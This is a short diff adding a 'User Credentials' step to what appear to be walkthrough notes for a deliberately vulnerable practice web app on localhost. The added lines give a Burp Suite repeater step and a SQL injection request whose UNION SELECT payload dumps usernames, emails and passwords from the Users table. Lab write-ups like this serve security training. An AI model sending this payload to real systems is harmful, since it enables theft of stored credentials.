@@ -304,7 +304,9 @@ openstego > extract data
 http://localhost:3000/#/contact
 comment > pickle rick
 
-
+### User Credentials
+burp suite > proxy > repeater
+GET /rest/products/search?q=apple'))union%20select%20id,username,email,password,5,6,7,8,9%20from%20Users-- HTTP/1.1
 
 
 
